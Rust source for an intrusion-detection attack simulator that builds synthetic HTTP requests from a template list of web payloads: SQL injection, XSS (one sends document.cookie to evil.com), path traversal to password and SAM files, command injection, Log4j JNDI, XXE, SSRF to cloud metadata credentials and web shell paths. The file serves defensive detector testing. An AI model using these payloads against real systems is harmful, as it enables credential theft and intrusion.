use crate::ids_engine::RequestData;
use rand::seq::SliceRandom;
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::sync::broadcast;

/// Attack template for the simulator
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackTemplate {
    pub attack_type: String,
    pub method: String,
    pub path: String,
    pub query: Option<serde_json::Value>,
    pub body: Option<serde_json::Value>,
    pub headers: serde_json::Value,
}

/// The attack simulator generates realistic attack traffic
pub struct AttackSimulator {
    pub running: AtomicBool,
    pub stop_tx: Mutex<Option<tokio::sync::oneshot::Sender<()>>>,
    templates: Vec<AttackTemplate>,
    attacker_ips: Vec<&'static str>,
    destinations: Vec<&'static str>,
}

impl AttackSimulator {
    pub fn new() -> Self {
        Self {
            running: AtomicBool::new(false),
            stop_tx: Mutex::new(None),
            templates: attack_templates(),
            attacker_ips: vec![
                "45.155.205.233", "91.134.148.42", "103.143.227.12", "185.220.101.45",
                "194.165.16.78", "5.188.206.14", "141.98.10.64", "212.193.30.155",
                "167.94.138.1", "198.235.24.201", "23.129.64.210", "31.184.198.85",
            ],
            destinations: vec![
                "10.0.1.5", "10.0.1.10", "10.0.2.20", "192.168.1.100",
                "192.168.1.50", "172.16.0.5", "10.0.0.1",
            ],
        }
    }

    /// Start the simulator with a given interval in milliseconds
    pub fn start(
        &self,
        interval_ms: u64,
        event_tx: broadcast::Sender<SimEvent>,
    ) {
        if self.running.load(Ordering::SeqCst) {
            return;
        }
        self.running.store(true, Ordering::SeqCst);
        tracing::info!("[Simulator] Started. Generating attacks every {}ms", interval_ms);

        let templates = self.templates.clone();
        let ips = self.attacker_ips.clone();
        let dests = self.destinations.clone();

        let (stop_tx, mut stop_rx) = tokio::sync::oneshot::channel::<()>();
        *self.stop_tx.lock().unwrap() = Some(stop_tx);

        tokio::spawn(async move {
            let mut interval = tokio::time::interval(std::time::Duration::from_millis(interval_ms));

            loop {
                tokio::select! {
                    _ = interval.tick() => {
                        let template = templates.choose(&mut rand::thread_rng()).unwrap();
                        let event = generate_event(template, &ips, &dests);
                        let _ = event_tx.send(SimEvent::Fire(event));
                    }
                    _ = &mut stop_rx => {
                        break;
                    }
                }
            }
        });
    }

    /// Stop the simulator
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        if let Some(tx) = self.stop_tx.lock().unwrap().take() {
            let _ = tx.send(());
        }
        tracing::info!("[Simulator] Stopped.");
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Generate a specific attack type
    pub fn generate_attack(&self, attack_type: &str) -> Option<RequestData> {
        let templates: Vec<_> = self.templates.iter().filter(|t| t.attack_type == attack_type).collect();
        if templates.is_empty() {
            return None;
        }
        let template = templates.choose(&mut rand::thread_rng()).unwrap();
        let event = generate_event(template, &self.attacker_ips, &self.destinations);
        Some(event)
    }
}

/// Events sent by the simulator to the handler
#[derive(Clone)]
pub enum SimEvent {
    Fire(RequestData),
}

fn generate_event(template: &AttackTemplate, ips: &[&str], dests: &[&str]) -> RequestData {
    let mut rng = rand::thread_rng();
    RequestData {
        method: template.method.clone(),
        path: template.path.clone(),
        query: template.query.clone(),
        body: template.body.clone(),
        headers: Some(template.headers.clone()),
        source_ip: ips.choose(&mut rng).unwrap().to_string(),
        source_port: Some(rng.gen_range(40000..60000)),
        destination: dests.choose(&mut rng).unwrap().to_string(),
    }
}

fn attack_templates() -> Vec<AttackTemplate> {
    let make = |attack_type: &str, method: &str, path: &str, query: Option<serde_json::Value>, body: Option<serde_json::Value>, headers: serde_json::Value| {
        AttackTemplate {
            attack_type: attack_type.to_string(),
            method: method.to_string(),
            path: path.to_string(),
            query,
            body,
            headers,
        }
    };

    let ua = || serde_json::json!({"user-agent": "Mozilla/5.0"});

    vec![
        // SQL Injection
        make("SQL Injection", "GET", "/api/user?id=1", Some(json!({"id": "1' UNION SELECT username,password FROM users--"})), None, ua()),
        make("SQL Injection", "GET", "/login.php", Some(json!({"user": "admin' OR '1'='1", "pass": "anything"})), None, ua()),
        make("SQL Injection", "POST", "/api/search", None, Some(json!({"q": "'; DROP TABLE users;--"})), ua()),
        make("SQL Injection", "GET", "/products", Some(json!({"cat": "1; WAITFOR DELAY '0:0:5'--"})), None, ua()),
        make("SQL Injection", "POST", "/auth", None, Some(json!({"username": "admin' AND 1=1--", "password": "x"})), ua()),

        // XSS
        make("Cross-Site Scripting (XSS)", "GET", "/search", Some(json!({"q": "<script>alert(\"XSS\")</script>"})), None, ua()),
        make("Cross-Site Scripting (XSS)", "GET", "/comment", Some(json!({"text": "<img src=x onerror=alert(document.cookie)>"})), None, ua()),
        make("Cross-Site Scripting (XSS)", "POST", "/profile", None, Some(json!({"bio": "<svg onload=fetch(\"http://evil.com/steal?c=\"+document.cookie)>"})), ua()),
        make("Cross-Site Scripting (XSS)", "GET", "/redirect", Some(json!({"url": "javascript:alert(1)"})), None, ua()),

        // Path Traversal
        make("Path Traversal", "GET", "/download", Some(json!({"file": "../../../../etc/passwd"})), None, ua()),
        make("Path Traversal", "GET", "/image", Some(json!({"path": "..%2f..%2f..%2fetc%2fshadow"})), None, ua()),
        make("Path Traversal", "GET", "/file.php", Some(json!({"name": "C:\\windows\\system32\\config\\SAM"})), None, ua()),

        // Command Injection
        make("Command Injection", "GET", "/ping", Some(json!({"host": "8.8.8.8; cat /etc/passwd"})), None, ua()),
        make("Command Injection", "POST", "/api/exec", None, Some(json!({"cmd": "127.0.0.1 | whoami"})), ua()),
        make("Command Injection", "GET", "/api/dns", Some(json!({"domain": "example.com`id`"})), None, ua()),

        // Log4j
        make("Log4j Injection", "GET", "/api/login", Some(json!({"user": "${jndi:ldap://evil.com/Exploit}"})), None, serde_json::json!({"user-agent": "${jndi:ldap://evil.com/x}"})),
        make("Log4j Injection", "POST", "/api/log", None, Some(json!({"message": "${jndi:ldap://evil.com/x}"})), ua()),

        // XXE
        make("XXE Injection", "POST", "/api/xml", None, Some("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>".into()), serde_json::json!({"content-type": "application/xml", "user-agent": "Mozilla/5.0"})),

        // SSRF
        make("SSRF", "GET", "/api/fetch", Some(json!({"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})), None, ua()),
        make("SSRF", "GET", "/proxy", Some(json!({"target": "http://127.0.0.1:8080/admin"})), None, ua()),

        // LFI
        make("LFI/RFI", "GET", "/include", Some(json!({"page": "php://filter/convert.base64-encode/resource=index.php"})), None, ua()),

        // Web Shell
        make("Web Shell", "GET", "/uploads/c99.php", None, None, ua()),
        make("Web Shell", "GET", "/images/shell.php", Some(json!({"cmd": "ls -la /tmp"})), None, ua()),

        // Scanner
        make("Scanner", "GET", "/.git/config", None, None, serde_json::json!({"user-agent": "sqlmap/1.5.2#stable (http://sqlmap.org)"})),
        make("Scanner", "GET", "/.env", None, None, serde_json::json!({"user-agent": "Nikto/2.1.6"})),
        make("Scanner", "GET", "/wp-admin/", None, None, serde_json::json!({"user-agent": "wpscan/3.8.18"})),

        // Normal (for contrast)
        make("NORMAL", "GET", "/api/products", Some(json!({"page": "1", "limit": "20"})), None, serde_json::json!({"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})),
        make("NORMAL", "GET", "/index.html", None, None, serde_json::json!({"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"})),
    ]
}
